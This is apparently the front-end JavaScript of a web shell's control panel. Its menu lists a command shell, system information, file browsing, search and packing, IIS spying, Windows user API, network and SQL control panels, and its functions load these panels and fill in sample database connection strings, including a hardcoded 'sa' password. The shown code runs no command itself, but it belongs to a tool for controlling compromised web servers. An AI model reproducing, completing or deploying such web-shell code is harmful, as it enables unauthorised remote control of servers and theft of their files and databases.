var opts ={ align: 'top'
, size: 48
, labels: true
, source: function(i){ return this.src.replace(/gif$/,'png'); }
};

var ActiveMenu='cmdshell,systeminfo,BackShow,SysInfo,FileExplore,PathPanal,GzipPanal,FileSearchPanal,IISspyPanal,NETPanal,WinUserAPIPanal,SQLControlPanal,aboutMe';

//动态菜单
jQuery(document).ready(function(){
  jQuery('#menu').jqDock(opts);
});

//加载代码
function LoadFunction()
{
	$("#LoadInc").load("function.txt");
	$("#PathPanal").load("FileBrows.txt");
	$("#GzipPanal").load("FilePack.txt");
	$("#FileSearchPanal").load("FileSearch.txt");
	$("#IISspyPanal").load("IISspy.txt");
	$("#WinUserAPIPanal").load("WinPAI.txt");
	$("#NETPanal").load("NetPanal.txt");
	$("#LoadInc").show();
	HidePanal();
	
}

//隐藏有所pannal
function HidePanal()
{
	var  am= ActiveMenu.split(',');
	for(var x=0;x<am.length;x++)   
	{   
       $("#"+am[x]).hide();
	}   
}


//cmd下拉框选项
function CommandSelect()
{
	//alert($("#SelectCommand").val());
	$("#DLLspy_q").val($("#SelectCommand").val());
	}



//下拉框，选择数据库类型
function SqlTypeChange()
{
	var connstr="";
	var sqltext="";
	var sqltype=$("#SqlType").val();
	if(sqltype=="sqlserver")
	{
		connstr="Data Source=8.8.8.18;Network Library=DBMSSOCN;Initial Catalog=NorthWind;User ID=sa;Password=123324;";
		sqltext="select user as 'Current User',@@version as 'Banner'";
		}
		
	if(sqltype=="access")
	{
		var connstr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\\mcTest.MDB";
		sqltext="Get All ACCESS TABLES";
		}
		
	$("#ConnStr").val(connstr);
	$("#SqlText").val(sqltext);
	
	}
	
	


//显示点击的panal
function GetDiv(divname)
{
	//$("#ShellPassWord").focus();
	//this.blur();
	 HidePanal();
	$("#"+divname).fadeIn("slow");
	if(divname=='cmdshell')
	{
		$("#BackShow").show();
	}
	if(divname=='systeminfo')
	{
		$("#systeminfo").show();
		$("#SysInfo").show();
		systeminfo();
	}
	if(divname=='FileExplore')
	{
		$("#PathPanal").fadeIn("slow");
		DirDirectory();
		}
	if(divname=='GzipPanal')
	{
		$("#packstate").html("");
		PackActionSelect();
		}
		
		
	
}

//文件打包功能选择
function PackActionSelect()
{
	var packaction=$("#packAction").val();
 
	if(packaction=="pack")
	{
		$("#SourcePathRow").fadeIn("slow");
		}
	if(packaction=="Unpack")
	{
		$("#SourcePathRow").hide();
		}
	}

 